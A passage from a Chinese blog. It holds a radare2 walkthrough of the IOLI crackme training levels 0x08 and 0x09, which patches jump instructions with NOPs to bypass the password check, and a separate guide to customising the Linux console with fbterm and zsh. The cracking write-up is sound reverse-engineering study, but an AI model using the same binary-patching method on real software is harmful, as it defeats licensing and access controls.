|   ||      <span class="number">0x08048677</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x08048679</span>    ebd1         jmp loc<span class="number">.0804864</span>c
|   ||      ; JMP XREF from <span class="number">0x08048643</span> (unk)
|   ||      ; JMP XREF from <span class="number">0x08048650</span> (unk)
|- loc<span class="number">.0804867</span>b <span class="number">2</span>
|   ``----&gt; <span class="number">0x0804867b</span>    c9           leave
\           <span class="number">0x0804867c</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.che
|          ; UNKNOWN XREF from <span class="number">0x08048524</span> (unk)
|          ; CALL XREF from <span class="number">0x0804862a</span> (unk)
/ (fcn) sym.che <span class="number">149</span>
|          <span class="number">0x08048524</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048525</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048527</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x0804852a</span>    c70424ad870. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048531</span>    e882feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x08048536</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|          <span class="number">0x0804853d</span>    e8a6feffff   call sym.imp.<span class="built_in">exit</span>
|             sym.imp.<span class="built_in">exit</span>()
|          ; CALL XREF from <span class="number">0x0804861e</span> (unk)
/ (fcn) sym.parell <span class="number">119</span>
|          <span class="number">0x08048542</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048543</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048545</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048548</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804854b</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x0804854f</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|          <span class="number">0x08048557</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804855a</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804855d</span>    e866feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x08048562</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x08048565</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048569</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804856c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804856f</span>    e840ffffff   call sym.dummy
|             sym.dummy()
|          <span class="number">0x08048574</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048576</span>    <span class="number">743f</span>         je loc<span class="number">.080485</span>b7
|      |   <span class="number">0x08048578</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x080485b5</span> (unk)
|- loc<span class="number">.0804857f</span> <span class="number">58</span>
|      |   <span class="number">0x0804857f</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x08048583</span>    <span class="number">7f</span>32         jg loc<span class="number">.080485</span>b7
|     ||   <span class="number">0x08048585</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048588</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x0804858b</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x0804858d</span>    <span class="number">7521</span>         jne loc<span class="number">.080485</span>b0
|    |||   <span class="number">0x0804858f</span>    <span class="number">833</span>d2ca0040. cmp dword [sym.LOL], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x08048596</span>    <span class="number">750</span>c         jne loc<span class="number">.080485</span>a4
|   ||||   <span class="number">0x08048598</span>    c70424c5870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|   ||||   <span class="number">0x0804859f</span>    e814feffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x08048596</span> (unk)
|- loc<span class="number">.080485</span>a4 <span class="number">21</span>
|   `----&gt; <span class="number">0x080485a4</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x080485ab</span>    e838feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x0804858d</span> (unk)
|- loc<span class="number">.080485</span>b0 <span class="number">9</span>
|    `---&gt; <span class="number">0x080485b0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485b3</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x080485b5</span>    ebc8         jmp loc<span class="number">.0804857f</span>
|     ||   ; JMP XREF from <span class="number">0x08048576</span> (unk)
|     ||   ; JMP XREF from <span class="number">0x08048583</span> (unk)
|- loc<span class="number">.080485</span>b7 <span class="number">2</span>
|     ``-&gt; <span class="number">0x080485b7</span>    c9           leave
\          <span class="number">0x080485b8</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485db</span>
[<span class="number">0x080485db</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485db</span>]&gt; s <span class="number">0x0804860f</span>
[<span class="number">0x0804860f</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804860f</span>]&gt; s <span class="number">0x08048576</span>
[<span class="number">0x08048576</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048576</span>]&gt; s <span class="number">0x08048583</span>
[<span class="number">0x08048583</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048583</span>]&gt; s <span class="number">0x0804858d</span>
[<span class="number">0x0804858d</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804858d</span>]&gt; s <span class="number">0x08048596</span>
[<span class="number">0x08048596</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048596</span>]&gt; q

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x08
IOLI Crackme Level <span class="number">0x08</span>
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x09">crackme0x09</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x09
IOLI Crackme Level <span class="number">0</span>x09
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>稍微计算下。看出来<code>ebp</code>作为某个时刻的栈顶指针用来索引字符串。一番搜索在某个<code>printf</code>中发现了<code>OK</code></p>
<pre><code>✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x09
 -- Use scr.accel to browse the file faster!
[<span class="number">0x08048420</span>]&gt; aa
[<span class="number">0x08048420</span>]&gt; pdf@main
|          ; UNKNOWN XREF from <span class="number">0x080486ae</span> (fcn<span class="number">.08048616</span>)
|          ; DATA XREF from <span class="number">0x08048437</span> (entry0)
/ (fcn) main <span class="number">120</span>
|          <span class="number">0x080486ee</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080486ef</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080486f1</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x080486f2</span>    <span class="number">81</span>ec84000000 sub esp, <span class="number">0x84</span>
|          <span class="number">0x080486f8</span>    e869000000   call fcn<span class="number">.08048766</span>
|             fcn<span class="number">.08048766</span>(unk, unk)
|          <span class="number">0x080486fd</span>    <span class="number">81</span>c3f7180000 add ebx, <span class="number">0x18f7</span>
|          <span class="number">0x08048703</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048706</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804870b</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804870e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048711</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048714</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x08048717</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048719</span>    <span class="number">8</span>d8375e8ffff lea eax, [ebx-<span class="number">0x178b</span>]
|          <span class="number">0x0804871f</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048722</span>    e8b9fcffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048727</span>    <span class="number">8</span>d838ee8ffff lea eax, [ebx-<span class="number">0x1772</span>]
|          <span class="number">0x0804872d</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048730</span>    e8abfcffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048735</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048738</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804873c</span>    <span class="number">8</span>d8399e8ffff lea eax, [ebx-<span class="number">0x1767</span>]
|          <span class="number">0x08048742</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048745</span>    e876fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x0804874a</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x0804874d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048751</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048754</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048757</span>    e8bafeffff   call fcn<span class="number">.08048616</span>
|             fcn<span class="number">.08048616</span>()
|          <span class="number">0x0804875c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048761</span>    <span class="number">8</span>b5dfc       mov ebx, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048764</span>    c9           leave
\          <span class="number">0x08048765</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; pdf@fcn<span class="number">.08048616</span>
            ; UNKNOWN XREF from <span class="number">0x080485cb</span> (fcn<span class="number">.0804855</span>d)
            ; CALL XREF from <span class="number">0x08048757</span> (unk)
/ (fcn) fcn<span class="number">.08048616</span> <span class="number">216</span>
|           <span class="number">0x08048616</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x08048617</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x08048619</span>    <span class="number">53</span>           push ebx
|           <span class="number">0x0804861a</span>    <span class="number">83</span>ec24       sub esp, <span class="number">0x24</span>
|           <span class="number">0x0804861d</span>    e844010000   call fcn<span class="number">.08048766</span>
|              fcn<span class="number">.08048766</span>(unk, unk)
|           <span class="number">0x08048622</span>    <span class="number">81</span>c3d2190000 add ebx, <span class="number">0x19d2</span>
|           <span class="number">0x08048628</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           <span class="number">0x0804862f</span>    c745f000000. mov dword [ebp-<span class="number">0x10</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048693</span> (fcn<span class="number">.08048616</span>)
|- fcn<span class="number">.08048636</span> <span class="number">184</span>
|     .---&gt; <span class="number">0x08048636</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x0804863c</span>    e88ffdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>()
|     |     <span class="number">0x08048641</span>    <span class="number">3945f</span>0       cmp [ebp-<span class="number">0x10</span>], eax
|     | ,=&lt; <span class="number">0x08048644</span>    <span class="number">734f</span>         jae loc<span class="number">.08048695</span>
|     | |   <span class="number">0x08048646</span>    <span class="number">8</span>b45f0       mov eax, [ebp-<span class="number">0x10</span>]
|     | |   <span class="number">0x08048649</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x0804864c</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x0804864f</span>    <span class="number">8845</span>ef       mov [ebp-<span class="number">0x11</span>], al
|     | |   <span class="number">0x08048652</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048655</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x08048659</span>    <span class="number">8</span>d835ee8ffff lea eax, [ebx-<span class="number">0x17a2</span>]
|     | |   <span class="number">0x0804865f</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     | |   <span class="number">0x08048663</span>    <span class="number">8</span>d45ef       lea eax, [ebp-<span class="number">0x11</span>]
|     | |   <span class="number">0x08048666</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x08048669</span>    e882fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x0804866e</span>    <span class="number">8</span>b55f8       mov edx, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048671</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048674</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x08048676</span>    <span class="number">837</span>df410     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804867a</span>    <span class="number">7512</span>         jne loc<span class="number">.0804868</span>e
|     |||   <span class="number">0x0804867c</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x0804867f</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048683</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x08048686</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x08048689</span>    e8fbfeffff   call fcn<span class="number">.08048589</span>
|     |||      fcn<span class="number">.08048589</span>()
|     ||    ; JMP XREF from <span class="number">0x0804867a</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.0804868</span>e <span class="number">96</span>
|     |`--&gt; <span class="number">0x0804868e</span>    <span class="number">8</span>d45f0       lea eax, [ebp-<span class="number">0x10</span>]
|     | |   <span class="number">0x08048691</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048693</span>    eba1         jmp fcn<span class="number">.08048636</span>
|       |   ; JMP XREF from <span class="number">0x08048644</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.08048695</span> <span class="number">89</span>
|       `-&gt; <span class="number">0x08048695</span>    e8c3feffff   call fcn<span class="number">.0804855</span>d
|       | &gt;    fcn<span class="number">.0804855</span>d()
|           <span class="number">0x0804869a</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x0804869d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x080486a1</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|           <span class="number">0x080486a4</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x080486a7</span>    e828feffff   call fcn<span class="number">.080484</span>d4
|              fcn<span class="number">.080484</span>d4() ; entry0+<span class="number">180</span>
|           <span class="number">0x080486ac</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x080486ae</span>    <span class="number">7438</span>         je loc<span class="number">.080486e8</span>
|    |      <span class="number">0x080486b0</span>    c745f000000. mov dword [ebp-<span class="number">0x10</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x080486e6</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486</span>b7 <span class="number">55</span>
|    |      <span class="number">0x080486b7</span>    <span class="number">837</span>df009     cmp dword [ebp-<span class="number">0x10</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x080486bb</span>    <span class="number">7f</span>2b         jg loc<span class="number">.080486e8</span>
|   ||      <span class="number">0x080486bd</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|   ||      <span class="number">0x080486c0</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x080486c3</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x080486c5</span>    <span class="number">751</span>a         jne loc<span class="number">.080486e1</span>
|  |||      <span class="number">0x080486c7</span>    <span class="number">8</span>d836fe8ffff lea eax, [ebx-<span class="number">0x1791</span>]
|  |||      <span class="number">0x080486cd</span>    <span class="number">890424</span>       mov [esp], eax
|  |||      <span class="number">0x080486d0</span>    e80bfdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x080486d5</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x080486dc</span>    e82ffdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
|  |        ; JMP XREF from <span class="number">0x080486c5</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486e1</span> <span class="number">13</span>
|  `------&gt; <span class="number">0x080486e1</span>    <span class="number">8</span>d45f0       lea eax, [ebp-<span class="number">0x10</span>]
|   ||      <span class="number">0x080486e4</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x080486e6</span>    ebcf         jmp loc<span class="number">.080486</span>b7
|   ||      ; JMP XREF from <span class="number">0x080486ae</span> (fcn<span class="number">.08048616</span>)
|   ||      ; JMP XREF from <span class="number">0x080486bb</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486e8</span> <span class="number">6</span>
|   ``----&gt; <span class="number">0x080486e8</span>    <span class="number">83</span>c424       add esp, <span class="number">0x24</span>
|           <span class="number">0x080486eb</span>    <span class="number">5</span>b           pop ebx
|           <span class="number">0x080486ec</span>    <span class="number">5</span>d           pop ebp
\           <span class="number">0x080486ed</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; pdf@fcn<span class="number">.08048589</span>
           ; CALL XREF from <span class="number">0x08048689</span> (fcn<span class="number">.08048616</span>)
/ (fcn) fcn<span class="number">.08048589</span> <span class="number">141</span>
|          <span class="number">0x08048589</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804858a</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804858c</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x0804858d</span>    <span class="number">83</span>ec14       sub esp, <span class="number">0x14</span>
|          <span class="number">0x08048590</span>    e8d1010000   call fcn<span class="number">.08048766</span>
|             fcn<span class="number">.08048766</span>(unk, unk)
|          <span class="number">0x08048595</span>    <span class="number">81</span>c35f1a0000 add ebx, <span class="number">0x1a5f</span>
|          <span class="number">0x0804859b</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x0804859e</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x080485a2</span>    <span class="number">8</span>d835ee8ffff lea eax, [ebx-<span class="number">0x17a2</span>]
|          <span class="number">0x080485a8</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080485ac</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x080485af</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080485b2</span>    e839feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>()
|          <span class="number">0x080485b7</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x080485ba</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080485be</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080485c1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080485c4</span>    e80bffffff   call fcn<span class="number">.080484</span>d4
|             fcn<span class="number">.080484</span>d4() ; entry0+<span class="number">180</span>
|          <span class="number">0x080485c9</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x080485cb</span>    <span class="number">7443</span>         je loc<span class="number">.08048610</span>
|      |   <span class="number">0x080485cd</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x0804860e</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.080485</span>d4 <span class="number">66</span>
|      |   <span class="number">0x080485d4</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x080485d8</span>    <span class="number">7f</span>36         jg loc<span class="number">.08048610</span>
|     ||   <span class="number">0x080485da</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485dd</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x080485e0</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x080485e2</span>    <span class="number">7525</span>         jne loc<span class="number">.08048609</span>
|    |||   <span class="number">0x080485e4</span>    <span class="number">8</span>b83fcffffff mov eax, [ebx-<span class="number">0x4</span>]
|    |||   <span class="number">0x080485ea</span>    <span class="number">833801</span>       cmp dword [eax], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x080485ed</span>    <span class="number">750</span>e         jne loc<span class="number">.080485f</span>d
|   ||||   <span class="number">0x080485ef</span>    <span class="number">8</span>d8361e8ffff lea eax, [ebx-<span class="number">0x179f</span>]
|   ||||   <span class="number">0x080485f5</span>    <span class="number">890424</span>       mov [esp], eax
|   ||||   <span class="number">0x080485f8</span>    e8e3fdffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x080485ed</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.080485f</span>d <span class="number">25</span>
|   `----&gt; <span class="number">0x080485fd</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x08048604</span>    e807feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x080485e2</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.08048609</span> <span class="number">13</span>
|    `---&gt; <span class="number">0x08048609</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     ||   <span class="number">0x0804860c</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x0804860e</span>    ebc4         jmp loc<span class="number">.080485</span>d4
|     ||   ; JMP XREF from <span class="number">0x080485cb</span> (fcn<span class="number">.0804855</span>d)
|     ||   ; JMP XREF from <span class="number">0x080485d8</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.08048610</span> <span class="number">6</span>
|     ``-&gt; <span class="number">0x08048610</span>    <span class="number">83</span>c414       add esp, <span class="number">0x14</span>
|          <span class="number">0x08048613</span>    <span class="number">5</span>b           pop ebx
|          <span class="number">0x08048614</span>    <span class="number">5</span>d           pop ebp
\          <span class="number">0x08048615</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; s 
<span class="number">0x8048420</span>
[<span class="number">0x08048420</span>]&gt; s <span class="number">0x08048644</span>
[<span class="number">0x08048644</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048644</span>]&gt; s <span class="number">0x0804867a</span>
[<span class="number">0x0804867a</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804867a</span>]&gt; s <span class="number">0x080485cb</span>
[<span class="number">0x080485cb</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485cb</span>]&gt; s <span class="number">0x080485d8</span>
[<span class="number">0x080485d8</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485d8</span>]&gt; s <span class="number">0x080485e2</span>
[<span class="number">0x080485e2</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485e2</span>]&gt; s <span class="number">0x080485ed</span>
[<span class="number">0x080485ed</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804852d</span>]&gt; s <span class="number">0x080485c4</span>
[<span class="number">0x080485c4</span>]&gt; wx <span class="number">9090909090</span>
[<span class="number">0x080485c4</span>]&gt; q

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x09
IOLI Crackme Level <span class="number">0x09</span>
Password: <span class="number">12345</span>
Password OK!
</code></pre><p>这不叫逆向……这叫把目标代码之外的东西都注释掉……</p>
<p>到此，忽然觉得吧，少了点东西。</p>
<ul>
<li>r2的动态调试功能</li>
<li>说好的reverse-engineer</li>
</ul>
<p>I find an interesting book: RE-for-beginers</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/uncategorized/2014/08/08/better-and-beautiful-console/" itemprop="url">
                  Better and Beautiful Console
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
              2014-08-08
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/uncategorized/2014/08/08/better-and-beautiful-console/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="uncategorized/2014/08/08/better-and-beautiful-console/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>一般的linux控制台（这还是gentoo配置过的默认bash呢）是这样的</p>
<p><img src="/images/plainconsole.png" alt="普通控制台"></p>
<p>而经过一番简单的配置之后，你的控制台是这样的</p>
<p><img src="/images/fbterm.png" alt="fbterm"></p>
<hr>
<h2 id="如何美化Linux下控制台（Better_Framebuffer）">如何美化Linux下控制台（Better Framebuffer）</h2><p>如果你运气足够好，碰上个有良心的发行版会帮你稍微配置下bash，增加些显示当前目录啊、彩色输出啊的功能。如果你足够悲剧，选择了一个以KISS为目标的发行版或者碰到一个无良发行版，你的bash就是个勉强能用的悲剧。</p>
<p>为了让终端在即使没有X也能漂亮起来，为了更加愉快的在没有X的Server下工作，为了不装X胜似装X。让我们开始配置一个漂亮的Linux控制台吧。</p>
<p>我是在gentoo linux完成配置的，首先安装必要的程序：</p>
<pre><code>emerge fbterm fcitx-fbterm fbv fbdump zsh oh-<span class="keyword">my</span>-zsh gpm
</code></pre><h2 id="zsh">zsh</h2><p>1.把zsh改成默认shell</p>
<pre><code>chsh <span class="operator">-s</span> zsh
</code></pre><p>2.修改zsh主题</p>
<pre><code><span class="setting">ZSH_THEME=<span class="value"><span class="string">"agnoster"</span></span></span>
</code></pre><p>至此，zsh配置完成。</p>
<h2 id="fbterm背景图片">fbterm背景图片</h2><p>3.为了让fbterm显示背景图像，建立一个比如说<code>.background_fbterm</code>作为fbterm启动的封装</p>
<pre><code> ~ ⮀ cat .background_fbterm
<span class="shebang">#!/bin/bash</span>
<span class="comment"># fbterm-bi: a wrapper script to enable background image with fbterm</span>
<span class="comment"># usage: fbterm-bi /path/to/image fbterm-options</span>
<span class="built_in">echo</span> <span class="operator">-ne</span> <span class="string">"\e[?25l"</span> <span class="comment"># hide cursor</span>
fbv -ciuker <span class="string">"<span class="variable">$1</span>"</span> &lt;&lt; EOF
</code></pre><p>q<br>    EOF<br>    shift<br>    export FBTERM_BACKGROUND_IMAGE=1<br>    exec fbterm “$@”</p>
<ol>
<li><p>在<code>.zshrc</code>中添加一个别名，指定背景图片。</p>
<h1 id="fbterm">fbterm</h1><p> alias fbterm=”sh ~/.background_fbterm ~/Pictures/wallpaper/girl.png”</p>
</li>
</ol>
<h2 id="中文输入法">中文输入法</h2><ol>
<li><p>在<code>.fbtermrc</code>中写入以下行，提供framebuffer下的中文输入法。</p>
<h1 id="specify_the_favorite_input_method_program_to_run">specify the favorite input method program to run</h1><p> input-method=fcitx-fbterm</p>
<h2 id="鼠标支持">鼠标支持</h2></li>
</ol>
<p>你会迷恋上中键粘帖的。</p>
<hr>
<p>看到没有，简单5步，即使没有X，一个漂亮、高效、支持中文显示和输入的控制台就诞生了。</p>
<p>ps:关于终端截图。<code>fbgrab</code>获取的图像错位，</p>
<p>即使多次尝试w和h：</p>
